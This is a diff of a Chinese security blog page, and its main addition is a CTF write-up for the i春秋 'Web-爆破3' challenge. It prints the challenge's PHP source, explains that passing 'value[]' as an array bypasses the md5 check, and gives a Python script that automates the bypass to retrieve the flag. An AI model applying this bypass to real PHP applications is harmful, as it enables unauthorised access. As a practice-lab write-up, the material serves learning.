@@ -66,6 +66,48 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ichunqiu-web-brute-3" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/10/ichunqiu-web-brute-3/" class="article-date">
+  <time datetime="2018-09-10T08:30:38.000Z" itemprop="datePublished">2018-09-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/10/ichunqiu-web-brute-3/">i春秋-Web-爆破3</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">        $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">        $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">        $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">    &#125;<span class="comment">//初始化成功次数，时间，whoami</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">        session_destroy();</span><br><span class="line">    &#125;<span class="comment">//超过两分钟，销毁session</span></span><br><span class="line"></span><br><span class="line">    $value = $_REQUEST[<span class="string">'value'</span>]; <span class="comment">//需要爆破的参数</span></span><br><span class="line">    $str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">    $str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)]; <span class="comment">//$str_rands为随机2位英文字母</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">        $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">        <span class="keyword">echo</span> $str_rands;</span><br><span class="line">    &#125;<span class="comment">//传入的参数与whoami比较，且md5值的6~9为必须为0或者字符串。下一个whoami值为当前$str_rands</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="comment">//成功次数&gt;10，打印flag</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里遇到一个小坑，就是md5比较的时候，纯粹要看RP，我本地爆破了半天，最多一次才成功跑到6，就失败了。</p>
+<p>后来想到，可以通过 <code>value[]</code> array参数 来绕过第二个逻辑表达式，一次成功。</p>
+<p>附爆破脚本 (其实手工也可以)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://626f230deed143bcb63490fc62362b9228ecdbe626d84899.game.ichunqiu.com/"</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'accept'</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">'accept-encoding'</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">        <span class="string">'accept-language'</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">        <span class="string">'connection'</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">        <span class="string">'upgrade-insecure-requests'</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">'user-agent'</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># init</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    times = <span class="number">0</span></span><br><span class="line">    whoami = [<span class="string">'e'</span>, <span class="string">'a'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        param = &#123;<span class="string">"value[]"</span>: whoami[<span class="number">0</span>] + whoami[<span class="number">1</span>]&#125;</span><br><span class="line">        response = s.get(url, params=param, headers=headers)</span><br><span class="line">        whoami = response.text[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> whoami[<span class="number">0</span>].isalpha() <span class="keyword">and</span> whoami[<span class="number">1</span>].isalpha():</span><br><span class="line">            times += <span class="number">1</span></span><br><span class="line">            print(whoami, times)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> times == <span class="number">10</span>:</span><br><span class="line">            print(<span class="string">'\n'</span>)</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://Jayl1n.github.io/2018/09/10/ichunqiu-web-brute-3/" data-id="cjmvlmtn3002dp8vng3a2f34w" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-ichunqiu-web-brute-2" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/09/10/ichunqiu-web-brute-2/" class="article-date">
@@ -102,7 +144,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Jayl1n.github.io/2018/09/10/ichunqiu-web-brute-2/" data-id="cjmamjdq7001330vnhvalgfat" class="article-share-link">Share</a>
+      <a data-url="http://Jayl1n.github.io/2018/09/10/ichunqiu-web-brute-2/" data-id="cjmvlmtmn0029p8vnlnkxoctr" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
@@ -155,7 +197,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Jayl1n.github.io/2018/09/10/ichunqiu-web-SQLi/" data-id="cjmamjdq2000y30vnogt887nw" class="article-share-link">Share</a>
+      <a data-url="http://Jayl1n.github.io/2018/09/10/ichunqiu-web-SQLi/" data-id="cjmvlmtml0027p8vnrszho8yp" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
@@ -199,7 +241,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Jayl1n.github.io/2018/09/09/daily-life-20180909/" data-id="cjmamjdpu000q30vnzc3igenh" class="article-share-link">Share</a>
+      <a data-url="http://Jayl1n.github.io/2018/09/09/daily-life-20180909/" data-id="cjmvlmtl6000pp8vn5tx7k59v" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/心路/">心路</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日常/">日常</a></li></ul>
@@ -403,7 +445,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Jayl1n.github.io/2018/08/07/sql-injection-cheat-sheet/" data-id="cjmamjdqf001d30vnqhhu5dsb" class="article-share-link">Share</a>
+      <a data-url="http://Jayl1n.github.io/2018/08/07/sql-injection-cheat-sheet/" data-id="cjmvlmtnk002np8vnule0fd4m" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql-injection/">sql-injection</a></li></ul>
@@ -446,7 +488,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Jayl1n.github.io/2018/08/02/exploit-erraticgopher/" data-id="cjmamjdpx000t30vnvunzq8k5" class="article-share-link">Share</a>
+      <a data-url="http://Jayl1n.github.io/2018/08/02/exploit-erraticgopher/" data-id="cjmvlmtlc000up8vnicg47m5e" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/EXPLOIT/">EXPLOIT</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SMB/">SMB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/远程溢出/">远程溢出</a></li></ul>
@@ -538,7 +580,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Jayl1n.github.io/2018/08/01/crawl-admin5/" data-id="cjmamjdpt000o30vn52k0isav" class="article-share-link">Share</a>
+      <a data-url="http://Jayl1n.github.io/2018/08/01/crawl-admin5/" data-id="cjmvlmtkz000np8vnmh84aahi" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/爬虫/">爬虫</a></li></ul>
@@ -583,7 +625,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Jayl1n.github.io/2018/07/31/yesterday-and-tomorrow/" data-id="cjmamjds8003n30vn2sx61sqz" class="article-share-link">Share</a>
+      <a data-url="http://Jayl1n.github.io/2018/07/31/yesterday-and-tomorrow/" data-id="cjmvlmtof002zp8vn6cn2dyd6" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/心路/">心路</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日常/">日常</a></li></ul>
@@ -613,7 +655,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/EXPLOIT/">EXPLOIT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Php/">Php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SMB/">SMB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Upload/">Upload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql-injection/">sql-injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/破译/">破译</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程溢出/">远程溢出</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/EXPLOIT/">EXPLOIT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Php/">Php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SMB/">SMB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Upload/">Upload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql-injection/">sql-injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/破译/">破译</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程溢出/">远程溢出</a></li></ul>
     </div>
   </div>
 
@@ -623,7 +665,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/BLOG/" style="font-size: 10px;">BLOG</a> <a href="/tags/EXPLOIT/" style="font-size: 10px;">EXPLOIT</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/Php/" style="font-size: 10px;">Php</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/SMB/" style="font-size: 10px;">SMB</a> <a href="/tags/SQLi/" style="font-size: 12.5px;">SQLi</a> <a href="/tags/Upload/" style="font-size: 10px;">Upload</a> <a href="/tags/Web/" style="font-size: 20px;">Web</a> <a href="/tags/i春秋/" style="font-size: 17.5px;">i春秋</a> <a href="/tags/sql-injection/" style="font-size: 10px;">sql-injection</a> <a href="/tags/心路/" style="font-size: 12.5px;">心路</a> <a href="/tags/日常/" style="font-size: 12.5px;">日常</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a> <a href="/tags/破译/" style="font-size: 10px;">破译</a> <a href="/tags/远程溢出/" style="font-size: 10px;">远程溢出</a>
+      <a href="/tags/BLOG/" style="font-size: 10px;">BLOG</a> <a href="/tags/EXPLOIT/" style="font-size: 10px;">EXPLOIT</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Php/" style="font-size: 10px;">Php</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/SMB/" style="font-size: 10px;">SMB</a> <a href="/tags/SQLi/" style="font-size: 12.5px;">SQLi</a> <a href="/tags/Upload/" style="font-size: 10px;">Upload</a> <a href="/tags/Web/" style="font-size: 20px;">Web</a> <a href="/tags/i春秋/" style="font-size: 17.5px;">i春秋</a> <a href="/tags/sql-injection/" style="font-size: 10px;">sql-injection</a> <a href="/tags/心路/" style="font-size: 12.5px;">心路</a> <a href="/tags/日常/" style="font-size: 12.5px;">日常</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a> <a href="/tags/破译/" style="font-size: 10px;">破译</a> <a href="/tags/远程溢出/" style="font-size: 10px;">远程溢出</a>
     </div>
   </div>
 
@@ -632,7 +674,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a></li></ul>
     </div>
   </div>
 
@@ -643,6 +685,10 @@
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2018/10/05/pentest-20181005/">渗透日记-20181005</a>
+          </li>
         
           <li>
             <a href="/2018/09/19/summary-sqli-bypass/">当SQL注入遇到WAF</a>
@@ -658,10 +704,6 @@
         
           <li>
             <a href="/2018/09/13/ichunqiu-web-whoareyou/">i春秋-Web-WhoAreYou</a>
-          </li>
-        
-          <li>
-            <a href="/2018/09/12/ichunqiu-web-time/">i春秋-Web-时间</a>
           </li>
         
       </ul>
